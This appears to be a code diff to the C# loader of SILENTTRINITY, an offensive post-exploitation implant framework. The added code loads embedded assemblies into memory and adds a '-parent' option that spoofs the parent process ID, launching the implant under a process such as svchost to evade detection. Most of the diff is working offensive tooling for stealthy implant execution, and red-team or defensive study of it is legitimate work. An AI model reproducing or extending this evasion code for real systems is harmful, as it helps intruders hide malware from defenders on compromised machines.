@@ -23,7 +23,7 @@ namespace SILENTTRINITY
 
         public dynamic CreateEngine()
         {
-            ScriptRuntimeSetup setup = Python.CreateRuntimeSetup(GetRuntimeOptions());
+            ScriptRuntimeSetup setup = Python.CreateRuntimeSetup(options: GetRuntimeOptions());
             var pyRuntime = new ScriptRuntime(setup);
             ScriptEngine engineInstance = Python.GetEngine(pyRuntime);
 
@@ -40,7 +40,7 @@ namespace SILENTTRINITY
                 where name.ToLowerInvariant().EndsWith(".zip")
                 select name;
            string resName = resQuery.Single();
-           Console.WriteLine("[*] Found embedded resource : {0}", resName);
+           Console.WriteLine("Found Python embedded stdlib: {0}", resName);
            var importer = new ResourceMetaPathImporter(asm, resName);
            dynamic sys = engineInstance.GetSysModule();
            sys.meta_path.append(importer);
@@ -52,12 +52,91 @@ namespace SILENTTRINITY
 
         private static IDictionary<string, object> GetRuntimeOptions()
         {
-            var options = new Dictionary<string, object>();
-            options["Debug"] = false;
+            var options = new Dictionary<string, object>
+            {
+                ["Debug"] = false
+            };
             return options;
         }
 
-        static void Main()
+        public static void DumpEmbeddedResources()
+        {
+            string[] resourceNames = Assembly.GetExecutingAssembly().GetManifestResourceNames();
+            foreach (string resourceName in resourceNames)
+            {
+                Console.WriteLine(resourceName);
+            }
+        }
+
+        public static void Main(string[] args)
+        {
+
+            Console.WriteLine("Available embedded resources:");
+            DumpEmbeddedResources();
+            Console.WriteLine("\n");
+
+            AppDomain.CurrentDomain.AssemblyResolve += (sender, resourceargs) => {
+
+                String assemblyName = new AssemblyName(resourceargs.Name).Name;
+                Console.WriteLine("Trying to resolve {0}", assemblyName);
+                String resourceName = "SILENTTRINITY.Resources." + assemblyName + ".dll";
+                // Console.WriteLine("resourceName: {0}", resourceName);
+
+                using (var stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(resourceName))
+                {
+
+                    Byte[] assemblyData = new Byte[stream.Length];
+
+                    stream.Read(assemblyData, 0, assemblyData.Length);
+                    
+                    return Assembly.Load(assemblyData);
+
+                }
+  
+            };
+
+            // Get Assembly Path 
+            string BinaryPath = Assembly.GetExecutingAssembly().CodeBase;
+            //string lpApplicationName = BinaryPath.Replace("file:///", string.Empty).Replace("/", @"\");
+            string lpApplicationName = Assembly.GetEntryAssembly().Location;
+
+            if (args.Length == 1 && args[0].ToLower() == "-parent")
+            {
+                Console.WriteLine("\n [+] Please enter a valid Parent Process name.");
+                Console.WriteLine(" [+] For Example: {0} -parent svchost", lpApplicationName);
+                return;
+            }
+            else if (args.Length == 2)
+            {
+                if (args[0].ToLower() == "-parent" && args[1] != null)
+                {
+                    string PPIDName = args[1];
+                    int NewPPID = 0;
+
+                    // Find PID from our new Parent and start new Process with new Parent ID
+                    NewPPID = ProcessCreator.NewParentPID(PPIDName);
+                    if (NewPPID == 0)
+                    {
+                        Console.WriteLine("\n [!] No suitable Process ID Found...");
+                        return;
+                    }
+
+                    if (!ProcessCreator.CreateProcess(NewPPID, lpApplicationName, null))
+                    {
+                        Console.WriteLine("\n [!] Oops PPID Spoof failed...");
+                        return;
+                    }
+                }
+            }
+            else
+            {
+                CreateRuntime();
+            }
+
+            return;
+        }
+
+        public static void CreateRuntime()
         {
 
                 Runtime runtime = new Runtime();
@@ -71,13 +150,7 @@ namespace SILENTTRINITY
                 }
                 catch
                 {
-                    Console.WriteLine("[-] Error accessing resources, dumping available resources:");
-                    string[] resourceNames = Assembly.GetExecutingAssembly().GetManifestResourceNames();
-                    foreach (string resourceName in resourceNames)
-                    {
-                        Console.WriteLine(resourceName);
-                    }
-
+                    Console.WriteLine("Error accessing embedded Main.py file");
                 }
 
                 ScriptEngine engine = runtime.CreateEngine();
